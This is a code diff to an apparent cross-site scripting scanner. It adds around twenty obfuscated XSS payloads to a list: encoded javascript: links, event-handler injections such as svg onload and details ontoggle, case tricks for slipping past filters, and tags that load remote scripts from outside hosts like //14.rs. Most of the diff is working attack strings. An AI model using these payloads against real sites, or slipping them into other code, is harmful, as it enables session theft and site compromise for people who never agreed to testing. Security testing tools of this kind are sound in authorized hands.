@@ -37,26 +37,46 @@ class core:
             "alert(6000/3000)",
             "alert(document.cookie)",
             "prompt(document.cookie)",
-            "console.log(5000/3000)"
+            "console.log(5000/3000)",
+            '<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z',
+            '<d3"<"/onclick="1>[confirm``]"<">z',
+            "<d3/onmouseenter=[2].find(confirm)>z",
+            "<details open ontoggle=confirm()>",
+            '<script y="><">/*<script* */prompt()</script',
+            '<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z',
+            '<a href="javascript%26colon;alert(1)">click',
+            "<a href=javas&#99;ript:alert(1)>click",
+            '<script/"<a"/src=data:=".<a,[8].some(confirm)>"',
+            '<svg/x=">"/onload=confirm()//',
+            "<--`<img/src=` onerror=confirm``> --!>",
+            "<svg%0Aonload=%09((pro\u006dpt))()//",
+            "<sCript x>(((confirm)))``</scRipt x>",
+            '<svg </onload ="1> (_=prompt,_(1)) "">"',
+            "<!--><script src=//14.rs>",
+            "<embed src=//14.rs>",
+            '<script x=">" src=//15.rs></script>',
+            "<iframe/src \/\/onload = prompt(1)",
+            "<x oncut=alert()>x",
+            "<svg onload=write()>"
         ]
         if eff == 1:
-            return "<script/>"+FUNCTION[randint(0, 4)]+"<\script\>"
+            return FUNCTION[randint(5, 20)]
 
         elif eff == 2:
-            return "<\script/>"+FUNCTION[randint(0, 4)]+"<\\script>"
+            return FUNCTION[randint(5, 20)]
 
         elif eff == 3:
-            return "<\script\> "+FUNCTION[randint(0, 4)]+"<//script>"
+            return FUNCTION[randint(5, 20)]
 
         elif eff == 4:
-            return "<script>"+FUNCTION[randint(0, 4)]+"<\script/>"
+            return FUNCTION[randint(5, 20)]
 
         elif eff == 5:
-            return "<script>"+FUNCTION[randint(0, 4)]+"<//script>"
+            return FUNCTION[randint(5, 20)]
 
         elif eff == 6:
-            return "<script>"+FUNCTION[randint(0, 4)]+"</script>"
-
+            return FUNCTION[randint(5, 20)]
+ 
     @classmethod
     def post_method(self):
         bsObj = BeautifulSoup(self.body, "html.parser")
